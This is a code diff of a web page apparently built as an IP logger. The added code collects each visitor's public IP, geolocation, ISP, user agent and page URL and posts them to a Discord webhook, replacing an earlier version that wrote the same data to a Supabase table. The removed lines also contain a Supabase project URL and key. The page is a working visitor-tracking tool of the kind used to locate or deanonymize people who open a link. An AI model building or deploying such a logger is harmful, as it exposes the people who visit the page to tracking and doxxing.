@@ -87,18 +87,14 @@
         <div class="ip-value" id="ipDisplay"><span class="spinner"></span>Fetching...</div>
         <div class="ip-detail" id="locationDisplay">Loading location...</div>
         <div class="ip-detail" id="ispDisplay"></div>
-        <div class="ip-status" id="statusDisplay">⏳ Logging to Supabase...</div>
+        <div class="ip-status" id="statusDisplay">⏳ Logging to Discord...</div>
     </div>
-
-    <!-- Load Supabase JS SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
     <script>
         // ============================================================
-        // YOUR SUPABASE CONFIG
+        // ⚠️ REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
         // ============================================================
-        const SUPABASE_URL = 'https://-8fYPUmjvAw309BWUoRtDg.supabase.co';
-        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_-8fYPUmjvAw309BWUoRtDg_rGy6gfsw';
+        const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
         // ============================================================
 
         // ─── VIDEO CONTROLS ───
@@ -111,41 +107,75 @@
         });
         document.addEventListener('click', () => { if (video.paused) video.play(); });
 
-        // ─── INITIALIZE SUPABASE ───
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);
+        // ─── SEND TO DISCORD WEBHOOK ───
+        async function sendToDiscord(ipData) {
+            // Create a cool embed message
+            const embed = {
+                title: '🛡️ New Visitor Logged',
+                color: 0x6c5ce7, // Purple
+                fields: [
+                    {
+                        name: '🌐 IP Address',
+                        value: `\`${ipData.ip}\``,
+                        inline: true
+                    },
+                    {
+                        name: '📍 Location',
+                        value: ipData.location || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: '🏢 ISP',
+                        value: ipData.isp || 'Unknown',
+                        inline: true
+                    },
+                    {
+                        name: '🖥️ User Agent',
+                        value: `\`${navigator.userAgent.substring(0, 100)}...\``,
+                        inline: false
+                    },
+                    {
+                        name: '⏰ Timestamp',
+                        value: new Date().toISOString().replace('T', ' ').substring(0, 19),
+                        inline: true
+                    },
+                    {
+                        name: '📄 Page',
+                        value: window.location.href,
+                        inline: true
+                    }
+                ],
+                footer: {
+                    text: 'comgirlservices · IP Logger',
+                    icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+                },
+                timestamp: new Date().toISOString()
+            };
 
-        // ─── LOG VISITOR TO SUPABASE ───
-        async function logToSupabase(ipData) {
-            try {
-                const { data, error } = await supabase
-                    .from('visitors')
-                    .insert([
-                        {
-                            ip: ipData.ip,
-                            location: ipData.location,
-                            isp: ipData.isp,
-                            city: ipData.city || 'Unknown',
-                            region: ipData.region || 'Unknown',
-                            country: ipData.country || 'Unknown',
-                            user_agent: navigator.userAgent,
-                            timestamp: new Date().toISOString()
-                        }
-                    ]);
+            const payload = {
+                content: null,
+                embeds: [embed],
+                username: 'IP Logger',
+                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
+            };
 
-                if (error) {
-                    console.error('Supabase insert error:', error);
-                    throw new Error(`Supabase error: ${error.message}`);
-                }
+            const response = await fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
 
-                console.log('[+] IP logged to Supabase successfully');
-                return true;
-            } catch (error) {
-                console.error('Failed to log to Supabase:', error);
-                throw error;
+            if (!response.ok) {
+                const errorText = await response.text();
+                throw new Error(`Discord webhook error: ${response.status} - ${errorText}`);
             }
+
+            return true;
         }
 
-        // ─── FETCH PUBLIC IP & LOG ───
+        // ─── FETCH PUBLIC IP & SEND TO DISCORD ───
         async function fetchAndLogIP() {
             const ipDisplay = document.getElementById('ipDisplay');
             const locationDisplay = document.getElementById('locationDisplay');
@@ -168,7 +198,7 @@
                 locationDisplay.textContent = `📍 ${locParts}`;
                 ispDisplay.textContent = data.org || data.isp || '';
 
-                // 3. Prepare data for Supabase
+                // 3. Prepare data for Discord
                 const ipData = {
                     ip: data.ip || 'Unknown',
                     location: locParts,
@@ -178,13 +208,13 @@
                     country: data.country_name || 'Unknown'
                 };
 
-                // 4. Log to Supabase
-                statusDisplay.textContent = '⏳ Sending to Supabase...';
-                await logToSupabase(ipData);
+                // 4. Send to Discord webhook
+                statusDisplay.textContent = '⏳ Sending to Discord...';
+                await sendToDiscord(ipData);
 
-                statusDisplay.textContent = '✅ Logged to Supabase!';
+                statusDisplay.textContent = '✅ Logged to Discord!';
                 statusDisplay.style.color = '#00ff88';
-                showToast('✅ IP logged to Supabase', 'success');
+                showToast('✅ IP sent to Discord webhook', 'success');
 
             } catch (error) {
                 console.error('Error:', error);
@@ -192,7 +222,7 @@
                 ipDisplay.style.color = '#ff6644';
                 statusDisplay.textContent = `❌ ${error.message}`;
                 statusDisplay.style.color = '#ff6644';
-                showToast('❌ Failed to log IP', 'error');
+                showToast('❌ Failed to send to Discord', 'error');
             }
         }
 
